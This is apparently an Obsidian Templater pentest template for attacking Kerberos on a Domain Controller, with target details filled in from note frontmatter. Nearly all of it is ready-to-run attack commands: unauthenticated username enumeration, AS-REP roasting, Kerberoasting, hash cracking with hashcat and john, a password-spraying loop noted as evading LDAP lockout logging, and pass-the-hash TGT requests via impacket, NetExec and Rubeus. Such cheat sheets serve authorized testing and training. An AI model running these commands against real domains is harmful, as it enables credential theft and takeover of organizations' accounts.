# Kerberos — Port <% tp.frontmatter.current_port %>
<%*
let ip = tp.frontmatter.target_ip
let domain = tp.frontmatter.domain
let dcIp = tp.frontmatter.dc_ip || ip
let user = tp.frontmatter.username || '<user>'
let pass = tp.frontmatter.password || '<pass>'
let domainUpper = domain.toUpperCase()
-%>

> [!info] Kerberos on port 88 means you're almost certainly targeting a **Domain Controller**. This opens up AS-REP Roasting, Kerberoasting, password spraying, and enumeration without credentials.

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %> --script=krb5-enum-users --script-args krb5-enum-users.realm='<% domainUpper %>',userdb=/usr/share/seclists/Usernames/Names/names.txt <% ip %>
```

---

## User Enumeration (no credentials)
```bash
# Kerbrute — fast username enumeration via Kerberos pre-auth errors
kerbrute userenum --dc <% dcIp %> --domain <% domain %> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute_users.txt
```

```bash
kerbrute userenum --dc <% dcIp %> --domain <% domain %> /usr/share/seclists/Usernames/Names/names.txt
```

```bash
# Build username list from known names (firstname.lastname, f.lastname, etc.)
# Use namemash.py with a names list
```

---

## AS-REP Roasting (no pre-auth required — no creds needed)
```bash
# Check for accounts that don't require Kerberos pre-authentication
impacket-GetNPUsers <% domain %>/ -dc-ip <% dcIp %> -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
```

```bash
# With credentials (enumerate all)
impacket-GetNPUsers <% domain %>/<% user %>:'<% pass %>' -dc-ip <% dcIp %> -request -format hashcat -outputfile asrep.txt
```

```bash
# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Password Spraying via Kerberos
```bash
# Kerbrute spray — Kerberos-based, no LDAP lockout logging
kerbrute passwordspray --dc <% dcIp %> --domain <% domain %> users.txt 'Password123!'
```

```bash
# Spray with multiple passwords (careful — lockout risk)
for pwd in 'Password123!' 'Welcome1!' 'Summer2024!' 'Winter2024!'; do
  echo "[*] Spraying: $pwd"
  kerbrute passwordspray --dc <% dcIp %> --domain <% domain %> users.txt "$pwd"
  sleep 30
done
```

---

## Kerberoasting (requires any valid domain user)
```bash
# Request SPNs for all kerberoastable accounts
impacket-GetUserSPNs <% domain %>/<% user %>:'<% pass %>' -dc-ip <% dcIp %> -request -outputfile kerberoast.txt
```

```bash
# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Get TGT (valid credentials)
```bash
impacket-getTGT <% domain %>/<% user %>:'<% pass %>' -dc-ip <% dcIp %>
```

```bash
# Export
export KRB5CCNAME=<% user %>.ccache
```

```bash
# With NTLM hash (pass the hash → Kerberos)
impacket-getTGT <% domain %>/<% user %> -hashes :<% tp.frontmatter.ntlm_hash || 'NTHASH' %> -dc-ip <% dcIp %>
```

```bash
# With AES key
impacket-getTGT <% domain %>/<% user %> -aesKey <% tp.frontmatter.aes256_hash || 'AES256KEY' %> -dc-ip <% dcIp %>
```

---

## NetExec Kerberos
```bash
nxc smb <% dcIp %> -u '<% user %>' -p '<% pass %>' --kerberos
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --kerberoasting kerberoast.txt
nxc ldap <% dcIp %> -u '<% user %>' -p '<% pass %>' --asreproast asrep.txt
```

---

## Rubeus (Windows)
```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt

# AS-REP Roasting
.\Rubeus.exe asreproast /nowrap /outfile:asrep.txt

# Get TGT
.\Rubeus.exe asktgt /user:<% user %> /password:'<% pass %>' /domain:<% domain %> /dc:<% dcIp %> /nowrap
```

---

## Enumerate KDC Details
```bash
# Check supported encryption types
nmap -p<% tp.frontmatter.current_port %> --script=krb5-enum-users --script-args krb5-enum-users.realm='<% domainUpper %>' <% ip %>
```

```bash
# ldap-based KDC info
dig SRV _kerberos._tcp.<% domain %> @<% dcIp %>
dig SRV _kerberos._tcp.dc._msdcs.<% domain %> @<% dcIp %>
```

---

## /etc/krb5.conf Setup (for impacket on Linux)
```ini
[libdefaults]
    default_realm = <% domainUpper %>
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    <% domainUpper %> = {
        kdc = <% dcIp %>
        admin_server = <% dcIp %>
    }

[domain_realm]
    .<% domain %> = <% domainUpper %>
    <% domain %> = <% domainUpper %>
```

---

## Notes
